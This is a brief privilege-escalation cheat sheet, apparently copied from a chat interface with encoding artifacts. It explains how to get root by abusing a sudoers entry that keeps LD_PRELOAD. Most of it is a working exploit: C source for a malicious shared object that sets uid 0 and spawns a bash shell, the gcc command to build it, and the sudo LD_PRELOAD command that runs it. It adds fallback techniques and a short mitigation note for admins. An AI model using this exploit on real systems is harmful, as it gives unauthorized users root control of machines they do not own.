ğŸ§  ITTT Workflow â€“ LD_PRELOAD Privilege Escalation
âœ… IF:
sudo -l reveals a binary you can run as root

AND you see:

makefile
Copy
Edit
env_keep+=LD_PRELOAD
AND the binary is not a known GTFOBin, so you canâ€™t just abuse it directly

ğŸ‘‰ THEN:
Create and inject your own shared object .so to escalate privileges.

ğŸ› ï¸ Step-by-Step TL;DR (Write it, Build it, Hijack it)
1. ğŸ” Check sudo -l
bash
Copy
Edit
sudo -l
Look for:

env_keep+=LD_PRELOAD

Something like:

bash
Copy
Edit
(root) NOPASSWD: /usr/sbin/apache2 restart
2. ğŸ§¬ Write the malicious shared object
c
Copy
Edit
// root.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD"); // Prevent recursion
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
3. ğŸ› ï¸ Compile the shared object
bash
Copy
Edit
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
4. âš ï¸ Exploit it with LD_PRELOAD + sudo'd binary
bash
Copy
Edit
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
5. ğŸ§™ You're root!
bash
Copy
Edit
id
# uid=0(root) gid=0(root)
ğŸ”’ Pro Tip â€” If It Fails:
If env_keep+=LD_PRELOAD isnâ€™t in sudo -l, this method wonâ€™t work.

Some binaries may drop privileges early, or LD_PRELOAD wonâ€™t affect them.

If sudo drops LD_PRELOAD, you might still try LD_LIBRARY_PATH, rpath tricks, or classic GTFOBins.

âš ï¸ Real-World Risk:
This is a misconfiguration in /etc/sudoers. Admins should:

Avoid keeping dangerous env vars like LD_PRELOAD

Use full paths + limit what can be run under sudo

